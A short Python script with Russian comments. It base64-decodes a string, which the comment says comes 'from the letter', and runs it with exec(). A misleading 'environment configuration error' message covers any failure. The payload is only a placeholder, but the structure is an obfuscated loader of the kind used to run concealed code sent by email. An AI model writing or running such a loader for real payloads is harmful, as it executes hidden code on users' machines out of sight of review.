import base64, sys

COMPRESSED_CORE = b'АБВГДЕ...' # ваша длинная зашифрованная строка из письма

try:
    exec(base64.b64decode(COMPRESSED_CORE).decode('utf-8'))
except Exception as e:
    print(f"[Ошибка конфигурации среды]: {e}")
    input("\nНажмите Enter для выхода...")
